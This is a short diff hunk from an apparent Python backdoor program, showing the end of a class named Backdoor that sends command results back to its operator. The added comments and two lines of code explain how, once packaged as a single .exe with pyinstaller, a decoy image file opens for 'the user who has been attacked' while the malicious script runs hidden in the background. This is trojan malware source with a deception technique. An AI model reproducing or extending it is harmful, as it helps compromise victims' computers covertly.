@@ -80,6 +80,9 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
+# The two lines of code below assure that with correct file embedded together into a single .exe using pyinstaller,
+# The additional file ("front file") will be opened regularly for the user who has been attacked
+# while the malicious Python script runs in the background, hidden from their eyes.
 # The file name needs to be changed accordingly based on what file we want to package with .py script.
 file_path = os.path.join(sys._MEIPASS, "python_black.jpg")
 subprocess.Popen(file_path, shell=True)
